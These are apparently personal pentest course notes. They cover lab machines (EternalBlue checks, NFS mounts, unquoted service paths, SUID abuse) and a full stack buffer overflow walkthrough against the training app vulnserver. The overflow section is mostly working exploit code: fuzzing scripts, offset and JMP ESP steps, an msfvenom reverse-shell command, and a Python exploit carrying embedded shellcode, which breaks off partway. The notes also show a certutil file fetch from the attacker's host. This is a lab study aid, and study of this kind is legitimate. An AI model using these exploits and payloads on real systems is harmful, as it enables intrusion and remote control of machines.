<h2 id="capstone">Capstone</h2>

<h3 id="blue">Blue</h3>

<p>With nmap we find that the target is using windows 7.
searched exploits <em>for</em> w7 and got eternal blue - MS17-010</p>

<p>in msf:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scanner/smb/smb_ms17_010 
exploit/windows/smb/ms17_010_eternalblue <span class="o">&gt;</span> check
</code></pre></div></div>

<p>To see if the machine is vulnerable to this exploit</p>

<p>We can try manual exploit via github &gt; search for eternal blue, it might blue screen the machine.</p>

<blockquote>
  <p>Tips: In real environments confirm permission to run the exploit, cause it might broke the machine.</p>
</blockquote>

<h3 id="academy">Academy</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hash-identifier
ffuf <span class="nt">-w</span> &lt;wordlist&gt; <span class="nt">-u</span> &lt;url&gt;/FUZZ
</code></pre></div></div>

<blockquote>
  <p>systemctl list-timers = to see each programs/backups ir running in timers</p>
</blockquote>

<blockquote>
  <p>pspy - github = To see all program that are running in the system</p>
</blockquote>

<blockquote>
  <p>[NOTE] ctrl+K in nano deletes a line</p>
</blockquote>

<h3 id="dev">Dev</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>showmount <span class="nt">-e</span> &lt;target ip&gt; <span class="o">=</span> to show file shares / mount drivers
<span class="nb">mkdir </span>mnt/&lt;name&gt;
mount <span class="nt">-t</span> nfs &lt;target ip&gt;:&lt;path that show <span class="k">in </span>showmount&gt; /mnt/&lt;name&gt; 

<span class="c"># -t = type</span>

<span class="c"># the path of the share &gt; the path that we will send the mounted share</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fcrackzip <span class="o">=</span> tool to crack zip files that have passwords:
<span class="c"># -v = verbose</span>
<span class="c"># -u = unzip</span>
<span class="c"># -D = dictionary attack</span>
<span class="c"># -p = wordlist file</span>
<span class="c"># &lt;the output file&gt;</span>
</code></pre></div></div>

<h3 id="butler">Butler</h3>

<p><strong>Grab files in windows</strong>:
after open a server</p>

<p>Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server

certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> http://&lt;kali ip&gt;/&lt;file&gt; &lt;output file&gt;
</code></pre></div></div>

<p>After winPeas:</p>

<p><strong>Unquoted service path</strong>:
Means that in file register of windows, it need to have quoted path in executable files, and sometimes that is not set in the machine.</p>

<p>Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>insecure ImagePath <span class="o">=</span> C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\W</span>ise<span class="se">\W</span>ise Care 365<span class="se">\B</span>ootTime.exe
secure <span class="nv">ImagePath</span><span class="o">=</span> <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files (x86)</span><span class="se">\W</span><span class="s2">ise</span><span class="se">\W</span><span class="s2">ise Care 365</span><span class="se">\B</span><span class="s2">ootTime.exe"</span>
</code></pre></div></div>

<blockquote>
  <p>When the service is unquoted, windows check for exe files in every space break!</p>
</blockquote>

<ul>
  <li>If we have write permissions,</li>
  <li>we can put a malicious file ‘for’ example in ..\Wise\Wise’.exe’, that should be executed.</li>
</ul>

<p><strong>To stop a service in Windows</strong>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc stop &lt;service&gt; <span class="o">=</span> to stop
sc query &lt;service&gt; <span class="o">=</span> to show status
sc start &lt;service&gt; <span class="o">=</span> to start
</code></pre></div></div>

<h3 id="blackpearl">BlackPearl</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnsrecon <span class="nt">-r</span> &lt;range 127.0.0.0/24&gt; <span class="nt">-n</span> &lt;target ip&gt; <span class="nt">-d</span> &lt;anything&gt;
ffuf <span class="nt">-w</span> &lt;wordlist&gt;:FUZZ <span class="nt">-u</span> &lt;url&gt;/FUZZ

find / <span class="nt">-type</span> f <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
GTFObins <span class="o">=</span> to abuse SUID 
</code></pre></div></div>

<h1 id="buffer-overflow">Buffer Overflow</h1>

<ul>
  <li>
    <p>Installed w10 enterprise:</p>

    <p>https://www.microsoft.com/pt-br/evalcenter/evaluate-windows-10-enterprise</p>
  </li>
  <li>
    <p>Immunity Debugger 1_85:</p>

    <p>https://www.immunityinc.com/products/debugger/</p>
  </li>
  <li>
    <p>vulnserver_master.zip:</p>

    <p>http://www.thegreycorner.com/p/vulnserver.html</p>
  </li>
  <li>
    <p>Installed W10 in a VM:</p>

    <p>NAT network</p>

    <p>Dont forget to turnoff windows defender and firewall</p>
  </li>
</ul>

<h2 id="anatomy-of-memory">Anatomy of Memory</h2>

<table>
  <tbody>
    <tr>
      <td>Kernel</td>
      <td>11111</td>
    </tr>
    <tr>
      <td>Stack</td>
      <td>&lt;’we are gonna focus in here’&gt;</td>
    </tr>
    <tr>
      <td>Heap</td>
      <td> </td>
    </tr>
    <tr>
      <td>Data</td>
      <td> </td>
    </tr>
    <tr>
      <td>Text</td>
      <td>00000</td>
    </tr>
  </tbody>
</table>

<h2 id="anatomy-of-stack">Anatomy of Stack</h2>

<table>
  <tbody>
    <tr>
      <td>ESP</td>
      <td>(extended stack pointer)</td>
    </tr>
    <tr>
      <td>Buffer Space</td>
      <td> </td>
    </tr>
    <tr>
      <td>EBP</td>
      <td>(extended base pointer)</td>
    </tr>
    <tr>
      <td>EIP</td>
      <td>(extended instruction pointer) / return address.</td>
    </tr>
  </tbody>
</table>

<blockquote>
  <p>Basically, We are gonna inject code to the top of the stack <strong>ESP</strong></p>
</blockquote>

<blockquote>
  <p>Until the code surpass the bottom and reach the EIP</p>
</blockquote>

<blockquote>
  <p>That is where we control the return address, to gain reverse shell or whatever suits us.</p>
</blockquote>

<h2 id="spiking">Spiking</h2>

<p>192.168.0.11
172.16.127.128</p>

<p>After connecting to the vulnserver:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nv</span> &lt;target ip&gt; &lt;port&gt;
</code></pre></div></div>

<p>we type HELP = to see all possibles valible commands</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HELP

Valid Commands:
HELP
STATS <span class="o">[</span>stat_value]
RTIME <span class="o">[</span>rtime_value]
LTIME <span class="o">[</span>ltime_value]
SRUN <span class="o">[</span>srun_value]
TRUN <span class="o">[</span>trun_value]
GMON <span class="o">[</span>gmon_value]
GDOG <span class="o">[</span>gdog_value]
KSTET <span class="o">[</span>kstet_value]
GTER <span class="o">[</span>gter_value]
HTER <span class="o">[</span>hter_value]
LTER <span class="o">[</span>lter_value]
KSTAN <span class="o">[</span>lstan_value]
EXIT
</code></pre></div></div>

<ul>
  <li>The spiking process is to test by sending caracteres and recon every command to see which is vulnerable</li>
  <li>So we have to test each one of them stats, rtime, ltime etc</li>
  <li>For this usage, we know that the vulnerable is the <strong>TRUN</strong></li>
</ul>

<h3 id="generic_send_tcp---trunspk-0-0">generic_send_tcp <ip> <port> trun.spk 0 0</port></ip></h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'mkdir stats.spk' s_readline(); s_string("STATS "); s_string_variable("0");
</code></pre></div></div>

<p>we just change the ‘s_string’ to the process we wanna to test
	‘mkdir trun.spk’
s_readline();
s_string(“TRUN “);
s_string_variable(“0”);</p>

<ul>
  <li>When we send the spiking script, the vulnerable application should crash</li>
  <li>And in the Registers we should see <strong>ESP</strong>, <strong>EBP</strong> and <strong>EIP</strong> overflowed with <strong>AAA</strong> or <strong>414141</strong></li>
</ul>

<blockquote>
  <p><strong>41</strong> is the hexdecimal of <strong>A</strong></p>
</blockquote>

<h2 id="fuzzing">Fuzzing</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="n">sys</span><span class="p">,</span> <span class="n">socket</span>
<span class="kn">from</span> <span class="n">time</span> <span class="kn">import</span> <span class="n">sleep</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">100</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">'</span><span class="s">172.16.127.128</span><span class="sh">'</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>

    <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">((</span><span class="sh">'</span><span class="s">TRUN /.:/</span><span class="sh">'</span> <span class="o">+</span> <span class="nb">buffer</span><span class="p">))</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="nb">buffer</span> <span class="o">=</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">100</span>
  <span class="k">except</span><span class="p">:</span>
    <span class="k">print</span> <span class="sh">"</span><span class="s">Fuzzing crashed at %s bytes</span><span class="sh">"</span> <span class="o">%</span><span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>
    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>

</code></pre></div></div>

<p>After running, it crashed the application and show us where aproximately it crashed:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="n">fuzz</span><span class="p">.</span><span class="n">py</span>
<span class="o">^</span><span class="n">C</span> <span class="n">Fuzzing</span> <span class="n">crashed</span> <span class="n">at</span> <span class="sh">'</span><span class="s">2400 bytes</span><span class="sh">'</span>
</code></pre></div></div>

<blockquote>
  <p>If I remember correctly we need to sum 400 bytes, so in 2800 we could overflow the EIP</p>
</blockquote>

<h2 id="finding-the-offset">Finding the Offset</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2800
# -l = length that we found fuzzing
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="n">sys</span><span class="p">,</span> <span class="n">socket</span>

<span class="n">offset</span> <span class="o">=</span> <span class="sh">""</span>

<span class="k">try</span><span class="p">:</span>
  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
  <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">'</span><span class="s">172.16.127.128</span><span class="sh">'</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
  <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">((</span><span class="sh">'</span><span class="s">TRUN /.:/</span><span class="sh">'</span> <span class="o">+</span> <span class="n">offset</span><span class="p">))</span>
  <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
  <span class="k">print</span> <span class="sh">"</span><span class="s">Error connecting to server</span><span class="sh">"</span>
  <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>

</code></pre></div></div>

<ul>
  <li>So we will generate the payload length with <strong>pattern_create</strong></li>
  <li>And copy the result in the offset variable</li>
  <li>Its supose to crash the application - great</li>
</ul>

<p>Now we run:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2800 -q 386F4337
# -l = length
# -q = the value we found in EIP after the crash
</code></pre></div></div>

<blockquote>
  <p>Exact match at <strong>offset</strong> 2003</p>
</blockquote>

<h2 id="overwriting-the-eip">Overwriting the EIP</h2>

<blockquote>
  <p>We discover the offset at 2003 that run before the EIP that is 4 bytes</p>
</blockquote>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="n">sys</span><span class="p">,</span> <span class="n">socket</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">2003</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="sh">"</span><span class="s">B</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">4</span>

<span class="k">try</span><span class="p">:</span>
  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
  <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">'</span><span class="s">172.16.127.128</span><span class="sh">'</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
  <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">((</span><span class="sh">'</span><span class="s">TRUN /.:/</span><span class="sh">'</span> <span class="o">+</span> <span class="n">shellcode</span><span class="p">))</span>
  <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
  <span class="k">print</span> <span class="sh">"</span><span class="s">Error connecting to server</span><span class="sh">"</span>
  <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>

</code></pre></div></div>

<ul>
  <li>We modified the last script with the found value of offset before the application break</li>
  <li>And we will execute <strong>B</strong> in those 4 bytes reserved for the <strong>EIP</strong></li>
  <li>So the result should crash the application again</li>
</ul>

<blockquote>
  <p>However, the value of EBP is 414141 and the value of EIP should be equal to <strong>42424242</strong> = “B”*4</p>
</blockquote>

<h2 id="finding-bad-characters">Finding Bad Characters</h2>
<p>→ https://github.com/cytopia/badchars</p>

<blockquote>
  <p>We are gonna add the badchars variable to our script and add in the shellcode variable also</p>
</blockquote>

<p>Like this:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="n">sys</span><span class="p">,</span> <span class="n">socket</span>

<span class="n">badchars</span> <span class="o">=</span> <span class="p">(</span>
  <span class="sh">"</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10</span><span class="sh">"</span>
  <span class="sh">"</span><span class="se">\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class="sh">"</span>
  <span class="sh">"</span><span class="se">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30</span><span class="sh">"</span>
  <span class="sh">"</span><span class="se">\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="sh">"</span>
  <span class="sh">"</span><span class="se">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50</span><span class="sh">"</span>
  <span class="sh">"</span><span class="se">\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span class="sh">"</span>
  <span class="sh">"</span><span class="se">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70</span><span class="sh">"</span>
  <span class="sh">"</span><span class="se">\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span class="sh">"</span>
  <span class="sh">"</span><span class="se">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90</span><span class="sh">"</span>
  <span class="sh">"</span><span class="se">\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span class="sh">"</span>
  <span class="sh">"</span><span class="se">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0</span><span class="sh">"</span>
  <span class="sh">"</span><span class="se">\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span class="sh">"</span>
  <span class="sh">"</span><span class="se">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0</span><span class="sh">"</span>
  <span class="sh">"</span><span class="se">\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span class="sh">"</span>
  <span class="sh">"</span><span class="se">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0</span><span class="sh">"</span>
  <span class="sh">"</span><span class="se">\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="sh">"</span>
<span class="p">)</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">2003</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="sh">"</span><span class="s">B</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">badchars</span>

<span class="k">try</span><span class="p">:</span>
  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
  <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">'</span><span class="s">172.16.127.128</span><span class="sh">'</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
  <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">((</span><span class="sh">'</span><span class="s">TRUN /.:/</span><span class="sh">'</span> <span class="o">+</span> <span class="n">shellcode</span><span class="p">))</span>
  <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
  <span class="k">print</span> <span class="sh">"</span><span class="s">Error connecting to server</span><span class="sh">"</span>
  <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>

</code></pre></div></div>

<ul>
  <li>This time go to Immunity Debugger &gt; register &gt; ESP &gt; follow in dump</li>
  <li>And try to find the badchars in the hexdump</li>
</ul>

<h3 id="how-to-find-bad-chars">How to find Bad Chars?</h3>

<p>Hex example:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>01 02 03 'B0 B0' 06 07 08
09 0A 0B 0C 0D 0E 0F 10
</code></pre></div></div>

<blockquote>
  <p>Here we can identifie the 04 05 are out of place, in this case the badchar is 04
the 05 value is just corrupted by the 04 char</p>
</blockquote>

<h2 id="finding-the-right-module">Finding the right module</h2>

<p>Here we are looking for DLL or something similar that has no memory protection</p>

<p>→ https://github.com/corelan/mona</p>

<p>Copy mona.py to ‘C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands</p>

<p>in Immunity Debugger type:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!mona modules
</code></pre></div></div>

<blockquote>
  <p>Here we have to choose a module without protection 
that have relation with the program we are attacking</p>
</blockquote>

<p>in kali:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

nasm &gt; JMP ESP
00000000  FFE4  jmp esp
</code></pre></div></div>

<h3 id="take-the-value---in-this-case-ffe4">Take the value - In this case FFE4</h3>
<p>in ImuDeb:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!mona find -s "\xff\xe4" -m essfunc.dll
</code></pre></div></div>

<ul>
  <li>The result is gonna be to show us the pointers</li>
  <li>We choose a pointer starting from the top</li>
</ul>

<p>In this case: 0x625011af</p>

<p>We need to reverse this pointer value like this:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'0x625011af' &gt;&gt; '\xaf\x11\x50\x62'
</code></pre></div></div>

<ul>
  <li>because x86 architectures read the lower order address first, thats why its in reverse</li>
</ul>

<p>Python updated:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1">#!/usr/bin/python 
</span>
<span class="kn">import</span> <span class="n">sys</span><span class="p">,</span> <span class="n">socket</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">2003</span>
<span class="c1"># eip = "B" * 4
</span><span class="n">pointer</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\xaf\x11\x50\x62</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">pointer</span> <span class="c1">#+ eip
</span>
<span class="k">try</span><span class="p">:</span>
  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
  <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">'</span><span class="s">172.16.127.128</span><span class="sh">'</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
  <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">((</span><span class="sh">'</span><span class="s">TRUN /.:/</span><span class="sh">'</span> <span class="o">+</span> <span class="n">shellcode</span><span class="p">))</span>
  <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
  <span class="k">print</span> <span class="sh">"</span><span class="s">Error connecting to server</span><span class="sh">"</span>
  <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>

</code></pre></div></div>

<h3 id="in-immunity">In Immunity</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Go to a blue arrow &gt; 'go to address in disassembler'
Type the address &gt; in this case: '625011af'
should appear the JMP ESP FFE4
press 'F2' to set a breakpoint in the address we wanna modify and run the script
</code></pre></div></div>

<blockquote>
  <p>This should break the application again and the value of EIP should be the same as our address 625011af</p>
</blockquote>

<h2 id="generating-shellcode-and-gaining-root">Generating Shellcode and Gaining Root</h2>

<h3 id="creating-the-reverse-shell-payload">Creating the reverse shell payload</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;our ip&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> c <span class="nt">-a</span> x86 <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span>

<span class="c"># -p = payload</span>
<span class="c"># EXITFUNC = let our payload more stable</span>
<span class="c"># -f = file type</span>
<span class="c"># -a = architecture</span>
<span class="c"># -b = badchars that we found during the process, in this case none so we add only the default </span>
</code></pre></div></div>

<ul>
  <li>always note the payload size, could be important</li>
  <li>copy the payload (between parenteses) to our last script</li>
  <li>moreover, we need to add a padding/NOP (no operational) space before the overflow payload</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1">#!/usr/bin/python
</span><span class="kn">import</span> <span class="n">sys</span><span class="p">,</span> <span class="n">socket</span>

<span class="n">offset</span> <span class="o">=</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">2003</span>
<span class="n">pointer</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\xaf\x11\x50\x62</span><span class="sh">"</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="p">(</span><span class="sh">"</span><span class="se">\xb8\x1e\x4c\x2e\xcc\xd9\xc9\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x52\x31\x47\x12\x03\x47\x12\x83\xd9\x48\xcc\x39\x19\xb8\x92</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\xc2\xe1\x39\xf3\x4b\x04\x08\x33\x2f\x4d\x3b\x83\x3b\x03\xb0</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x68\x69\xb7\x43\x1c\xa6\xb8\xe4\xab\x90\xf7\xf5\x80\xe1\x96</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x75\xdb\x35\x78\x47\x14\x48\x79\x80\x49\xa1\x2b\x59\x05\x14</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\xdb\xee\x53\xa5\x50\xbc\x72\xad\x85\x75\x74\x9c\x18\x0d\x2f</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x3e\x9b\xc2\x5b\x77\x83\x07\x61\xc1\x38\xf3\x1d\xd0\xe8\xcd</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\xde\x7f\xd5\xe1\x2c\x81\x12\xc5\xce\xf4\x6a\x35\x72\x0f\xa9</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x47\xa8\x9a\x29\xef\x3b\x3c\x95\x11\xef\xdb\x5e\x1d\x44\xaf</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x38\x02\x5b\x7c\x33\x3e\xd0\x83\x93\xb6\xa2\xa7\x37\x92\x71</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\xc9\x6e\x7e\xd7\xf6\x70\x21\x88\x52\xfb\xcc\xdd\xee\xa6\x98</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x12\xc3\x58\x59\x3d\x54\x2b\x6b\xe2\xce\xa3\xc7\x6b\xc9\x34</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x27\x46\xad\xaa\xd6\x69\xce\xe3\x1c\x3d\x9e\x9b\xb5\x3e\x75</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x5b\x39\xeb\xda\x0b\x95\x44\x9b\xfb\x55\x35\x73\x11\x5a\x6a</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x63\x1a\xb0\x03\x0e\xe1\x53\xec\x67\xe9\xa8\x84\x75\xe9\xbf</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x08\xf3\x0f\xd5\xa0\x55\x98\x42\x58\xfc\x52\xf2\xa5\x2a\x1f</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x34\x2d\xd9\xe0\xfb\xc6\x94\xf2\x6c\x27\xe3\xa8\x3b\x38\xd9</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\xc4\xa0\xab\x86\x14\xae\xd7\x10\x43\xe7\x26\x69\x01\x15\x10</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\xc3\x37\xe4\xc4\x2c\xf3\x33\x35\xb2\xfa\xb6\x01\x90\xec\x0e</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x89\x9c\x58\xdf\xdc\x4a\x36\x99\xb6\x3c\xe0\x73\x64\x97\x64</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x05\x46\x28\xf2\x0a\x83\xde\x1a\xba\x7a\xa7\x25\x73\xeb\x2f</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x5e\x69\x8b\xd0\xb5\x29\xab\x32\x1f\x44\x44\xeb\xca\xe5\x09</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x0c\x21\x29\x34\x8f\xc3\xd2\xc3\x8f\xa6\xd7\x88\x17\x5b\xaa</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x81\xfd\x5b\x19\xa1\xd7</span><span class="sh">"</span><span class="p">)</span>

<span class="n">padding</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">20</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">pointer</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">overflow</span>

<span class="k">try</span><span class="p">:</span>
	<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
